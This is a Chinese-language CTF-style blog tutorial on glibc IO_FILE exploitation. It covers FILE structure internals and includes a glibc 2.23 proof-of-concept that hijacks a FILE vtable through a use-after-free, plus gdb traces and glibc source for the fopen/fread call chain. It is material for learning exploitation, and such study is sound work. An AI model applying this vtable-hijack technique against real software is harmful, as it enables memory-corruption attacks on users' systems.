<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>零基础要如何破除 IO_FILE 利用原理的迷雾 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>零基础要如何破除 IO_FILE 利用原理的迷雾</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-09-20T14:41:16.000Z" id="date"> 2022-09-20</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-12-29T04:50:35.023Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久以前，在我完成 Glibc2.23 的基本堆利用学习以后，IO_FILE 的利用就被提上日程了，但苦于各种各样的麻烦因素，时至今日，我才终于动笔开始学习这种利用技巧，实属惭愧。</p>
<p>近几年，由于堆利用的条件越来越苛刻，加之几个常用的劫持 hook 被删除，IO 的地位逐渐有超过堆利用的趋势，因此为了跟上这几年的新潮，赶紧回来学习一下 IO 流的利用技巧。</p>
<p>如果本文存在任何错误，请务必与我联系。</p>
<p>最开始是打算跟着内核去看 IO_FILE 的，但是最近内核的学习暂时搁置了，于是迫不得已现在就开始学 IO 了，不过也还好，这部分内容跟着其他师傅的文章去学，似乎也不会太成问题，有问题就是我的问题。而且主要涉及到的内容其实和内核无关，都是些 GLIBC 的源代码，这部分其实还在用户层，不过大多数利用都在通过 largebin attack 进行，因此可能还是需要一部分的堆利用基础的。</p>
<blockquote>
<p>不过下文大多数情况都建立在读者已经理解 largebin attack 的前提下进行，其具体只表现为 “任意地址写一个堆地址”，因此以笔者个人认为，即便不明白其对应的利用原理，只要知道能够完成一次任意地址读写，就不会对之后的说明在理解上遇到障碍。</p>
</blockquote>
<p>本文的行文逻辑如下：</p>
<ul>
<li>IO_FILE 结构体和虚表调用逻辑</li>
<li>虚表调用的跟踪分析</li>
<li>低版本下，劫持虚表的利用原理</li>
<li>对劫持虚表的保护原理分析</li>
<li>高版本下，调用链劫持原理</li>
<li>具体的利用手段</li>
</ul>
<h1 id="IO-FILE-结构体"><a href="#IO-FILE-结构体" class="headerlink" title="IO_FILE 结构体"></a>IO_FILE 结构体</h1><p>首先是一个基本的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>结构体成员包括一个用于描述文件各个属性的结构体和一个用于描述文件操作行为的跳转表指针。其中，文件属性通过 _IO_FILE 结构体描述：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>且先不论整个结构体的各个成员的具体作用，这里仅记录几个较为重要的内容。</p>
<p>来看看跳转表的行为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>该跳转表定义了对文件执行相应操作时具体会使用的行为函数，例如 _IO_read_t 对应了 __read 虚函数，在生成该文件结构时，每个条目占用 8 字节，以具体的函数地址填充。</p>
<p>简单来说，文件结构形式如下：</p>
<p class='item-img' data-src='https://storage.tttang.com/media/attachment/2022/09/16/40874315-43d1-4950-9183-9c5522d2d0b5.png'><img src="https://storage.tttang.com/media/attachment/2022/09/16/40874315-43d1-4950-9183-9c5522d2d0b5.png"></p>
<h1 id="GLIBC2-23-与-跳转表劫持"><a href="#GLIBC2-23-与-跳转表劫持" class="headerlink" title="GLIBC2.23 与 跳转表劫持"></a>GLIBC2.23 与 跳转表劫持</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwn</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dave, my mind is going.\n&quot;</span>);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>&#125;<br><br><span class="hljs-type">void</span> * funcs[] = &#123;<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// &quot;extra word&quot;</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// DUMMY</span><br>    <span class="hljs-built_in">exit</span>, <span class="hljs-comment">// finish</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// overflow</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// underflow</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// uflow</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// pbackfail</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsputn</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsgetn</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekoff</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekpos</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// setbuf</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// sync</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// doallocate</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// read</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// write</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seek</span><br>    pwn,  <span class="hljs-comment">// close</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// stat</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// showmanyc</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// imbue</span><br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *str;<br><br>    str = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(FILE) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span> *));<br>    <span class="hljs-built_in">free</span>(str);<br><br>    <span class="hljs-keyword">if</span> (!(fp = fopen(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>))) &#123;<br>        perror(<span class="hljs-string">&quot;fopen&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(str + <span class="hljs-keyword">sizeof</span>(FILE)) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)funcs;<br><br>    fclose(fp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上述 POC 中通过 UAF 漏洞来劫持 fp 指针的指向。</p>
<p>在打开一个文件时，系统会调用 malloc 来开辟对应的 _IO_FILE_plus ，而最后的跳转表为一个指针，通过修改改指针，可以令跳转表被劫持为自己设定的目标：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(str + <span class="hljs-keyword">sizeof</span>(FILE)) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)funcs;<br></code></pre></td></tr></table></figure>

<p>这部分的内容，其实我已经看过很多次，而每次都停在这里。各种各样的文章都会从这个版本开始，但实话实说，以今天的视点来看已经相当鸡肋了，似乎完全没必要在乎这个版本下劫持跳转表的利用方法，因为自 2.24 以来加入了保护，如今已经更迭了如此之多的版本，似乎没有太大意义了。</p>
<h1 id="细节与深入分析"><a href="#细节与深入分析" class="headerlink" title="细节与深入分析"></a>细节与深入分析</h1><p>前问刚说没有太大意义，这一小节就开始深入分析了，这似乎显得有点矛盾。但笔者现在逐渐能够理解这其中的意义以及这条利用的艰辛了。</p>
<blockquote>
<p>尽管古早的利用已经距今久远，可是对于后来的人们，他们仍然需要从那遥远的旧版本开始前进。人们走得越远，后来的人们却仍要在同样的路上走相同的距离。<br>(尽管现在总说，新的 apple 和 cat 能够通杀，但说实话，如果我没看过前面的利用，就不太能理解这两个新技巧了。)</p>
</blockquote>
<p>首先，不妨先用以下的代码来跟踪一下 IO_FILE 的创建流程和虚表的执行跳转：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">20</span>];<br>    FILE*fp=fopen(<span class="hljs-string">&quot;toka&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>);<br>    fread(data,<span class="hljs-number">1</span>,<span class="hljs-number">20</span>,fp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>首先我们将断点打在 fopen ，此时的 IO_FILE 如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs sh">gdb-peda$ p _IO_list_all<br><span class="hljs-variable">$8</span> = (struct _IO_FILE_plus *) 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;<br>gdb-peda$ p stderr<br><span class="hljs-variable">$10</span> = (struct _IO_FILE *) 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;<br>gdb-peda$ p *_IO_list_all<br><span class="hljs-variable">$9</span> = &#123;<br>  file = &#123;<br>    _flags = 0xfbad2086,<br>    _IO_read_ptr = 0x0,<br>    _IO_read_end = 0x0,<br>    _IO_read_base = 0x0,<br>    _IO_write_base = 0x0,<br>    _IO_write_ptr = 0x0,<br>    _IO_write_end = 0x0,<br>    _IO_buf_base = 0x0,<br>    _IO_buf_end = 0x0,<br>    _IO_save_base = 0x0,<br>    _IO_backup_base = 0x0,<br>    _IO_save_end = 0x0,<br>    _markers = 0x0,<br>    _chain = 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;,<br>    _fileno = 0x2,<br>    _flags2 = 0x0,<br>    _old_offset = 0xffffffffffffffff,<br>    _cur_column = 0x0,<br>    _vtable_offset = 0x0,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = 0x7ffff7dd3770 &lt;_IO_stdfile_2_lock&gt;,<br>    _offset = 0xffffffffffffffff,<br>    _codecvt = 0x0,<br>    _wide_data = 0x7ffff7dd1660 &lt;_IO_wide_data_2&gt;,<br>    _freeres_list = 0x0,<br>    _freeres_buf = 0x0,<br>    __pad5 = 0x0,<br>    _mode = 0x0,<br>    _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="hljs-built_in">times</span>&gt;<br>  &#125;,<br>  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以注意到，<code>_IO_list_all</code> 作为一个链表表头符号，记录了具体的 IO_FILE 地址，此时的第一个就是 stderr ，而剩余的文件通过 _chain 连接。</p>
<p>而在打开第一个文件以后，此时的链表标头转为：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs sh">gdb-peda$ p _IO_list_all<br><span class="hljs-variable">$12</span> = (struct _IO_FILE_plus *) 0x602010<br>gdb-peda$ p *_IO_list_all<br><span class="hljs-variable">$11</span> = &#123;<br>  file = &#123;<br>    _flags = 0xfbad2488,<br>    _IO_read_ptr = 0x0,<br>    _IO_read_end = 0x0,<br>    _IO_read_base = 0x0,<br>    _IO_write_base = 0x0,<br>    _IO_write_ptr = 0x0,<br>    _IO_write_end = 0x0,<br>    _IO_buf_base = 0x0,<br>    _IO_buf_end = 0x0,<br>    _IO_save_base = 0x0,<br>    _IO_backup_base = 0x0,<br>    _IO_save_end = 0x0,<br>    _markers = 0x0,<br>    _chain = 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,<br>    _fileno = 0x3,<br>    _flags2 = 0x0,<br>    _old_offset = 0x0,<br>    _cur_column = 0x0,<br>    _vtable_offset = 0x0,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = 0x6020f0,<br>    _offset = 0xffffffffffffffff,<br>    _codecvt = 0x0,<br>    _wide_data = 0x602100,<br>    _freeres_list = 0x0,<br>    _freeres_buf = 0x0,<br>    __pad5 = 0x0,<br>    _mode = 0x0,<br>    _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="hljs-built_in">times</span>&gt;<br>  &#125;,<br>  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以注意到，此地址来自于堆内存：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sh">gdb-peda$ heap<br>0x602000 PREV_INUSE &#123;<br>  prev_size = 0x0,<br>  size = 0x231,<br>  fd = 0xfbad2488,<br>  bk = 0x0,<br>  fd_nextsize = 0x0,<br>  bk_nextsize = 0x0<br>&#125;<br>0x602230 PREV_INUSE &#123;<br>  prev_size = 0x7ffff7dd0260,<br>  size = 0x20dd1,<br>  fd = 0x0,<br>  bk = 0x0,<br>  fd_nextsize = 0x0,<br>  bk_nextsize = 0x0<br>&#125;<br></code></pre></td></tr></table></figure>

<p>说明在为文件创建抽象实体的过程中，会申请堆内存来储存具体的结构体数据。</p>
<p>接下来调用 <code>fread</code> ，其调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">fread -&gt; _IO_sgetn -&gt; __GI__IO_file_xsgetn -&gt; _IO_doallocbuf -&gt; _IO_file_doallocate -&gt; __underflow -&gt; _IO_file_underflow<br></code></pre></td></tr></table></figure>

<p>其中，<code>_IO_sgetn</code> 作为前导函数，它会读取 vtable 中的对应值从而得到 <code>__GI__IO_file_xsgetn</code> 的函数地址，该函数作为具体实现。</p>
<p>调用逻辑大致如下：</p>
<p class='item-img' data-src='https://storage.tttang.com/media/attachment/2022/09/16/a407603e-c677-438b-8e7b-12584bcc48b2.png'><img src="https://storage.tttang.com/media/attachment/2022/09/16/a407603e-c677-438b-8e7b-12584bcc48b2.png"></p>
<p>而 <code>_IO_doallocbuf</code> 和 <code>__underflow</code> 也都是前导函数，用来调用虚表中的 <code>_IO_file_doallocate</code> 和 <code>_IO_file_underflow</code> 。</p>
<p>用中文描述这个逻辑的意思大概是：</p>
<blockquote>
<p>通过 vtable 调用 __GI__IO_file_xsgetn 。<br>如果此前已经为文件开辟过缓冲区，则继续；否则通过 _IO_file_doallocate 来开辟对应的缓冲区。<br>如果缓冲区为空，则通过 _IO_file_underflow 将数据复制到缓冲区中；否则继续。<br>最后将缓冲区中的数据拷贝到用户自己的缓冲区中。</p>
</blockquote>
<p>接下来我们跟一下源代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_fread (<span class="hljs-type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)<br>&#123;<br>  _IO_size_t bytes_requested = size * count;<br>  _IO_size_t bytes_read;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (bytes_requested == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br>  bytes_read = _IO_sgetn (fp, (<span class="hljs-type">char</span> *) buf, bytes_requested);<br>  _IO_release_lock (fp);<br>  <span class="hljs-keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;<br>&#125;<br>libc_hidden_def (_IO_fread)<br></code></pre></td></tr></table></figure>

<p>这段代码并没有太多内容。首先获得文件锁，然后调用 _IO_sgetn 进行读取，完成后释放锁，并返回读取的字节数。</p>
